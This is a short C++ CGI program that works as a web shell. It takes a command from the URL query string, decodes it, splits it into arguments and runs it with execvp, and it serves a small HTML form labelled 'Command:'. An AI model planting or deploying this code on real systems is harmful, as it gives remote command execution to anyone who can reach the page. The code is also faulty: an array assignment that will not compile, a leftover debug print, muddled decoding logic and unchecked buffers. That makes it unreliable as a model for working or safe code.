#include<cstdio>
#include<iostream>
#include<string>
#include<unistd.h>
#include<cstdlib>
#include<cstring>
using namespace std;
string UrlDecode(const std::string& szToDecode)
{
    std::string result;
    int hex = 0;
    for (size_t i = 0; i < szToDecode.length(); ++i)
    {
        switch (szToDecode[i])
        {
        case '+':
            result += ' ';
            break;
        case '%':
            if (isxdigit(szToDecode[i + 1]) && isxdigit(szToDecode[i + 2]))
            {
                std::string hexStr = szToDecode.substr(i + 1, 2);
                hex = strtol(hexStr.c_str(), 0, 16);
                if (!((hex >= 48 && hex <= 57) || //0-9
                    (hex >=97 && hex <= 122) ||   //a-z
                    (hex >=65 && hex <= 90)) ||    //A-Z
                    hex == 0x21 || hex == 0x24 || hex == 0x26 || hex == 0x27 || hex == 0x28 || hex == 0x29
                    || hex == 0x2a || hex == 0x2b|| hex == 0x2c || hex == 0x2d || hex == 0x2e || hex == 0x2f
                    || hex == 0x3A || hex == 0x3B|| hex == 0x3D || hex == 0x3f || hex == 0x40 || hex == 0x5f
                    )
                {
                    result += char(hex);
                    cout << "zz" << endl;
                    i += 2;
                }
                else result += '%';
            }else {
                result += '%';
            }
            break;
        default:
            result += szToDecode[i];
            break;
        }
    }
    return result;
}
int main(){
	char arg[1024],*tmp,urldecode[1024];
	char *cmd[1024];
	int i,n;
	n=0;
	arg=getenv("QUERY_STRING");
    for(i=0;i<strlen(arg)-4;i++)
		arg[i]=arg[i+4];
	arg[i]='\0';
	string url(arg);
	url=UrlDecode(url);
	strcpy(urldecode,url.c_str());
    cmd[n]=strtok(urldecode," ");
	n++;
	tmp=strtok(NULL," ");
	while(tmp){
		cmd[n]=tmp;
		n++;
		tmp=strtok(NULL," ");
	}
	cmd[n]=0;
	cout << "Content-Type: text/html\n\n" << endl;
	cout << "<form method=\"GET\">" << endl;
	cout << "Command:" << endl;
	cout << "<input type=\"text\" name=\"cmd\"></form>" << endl;
	execvp(cmd[0],cmd);
	return 0;
}
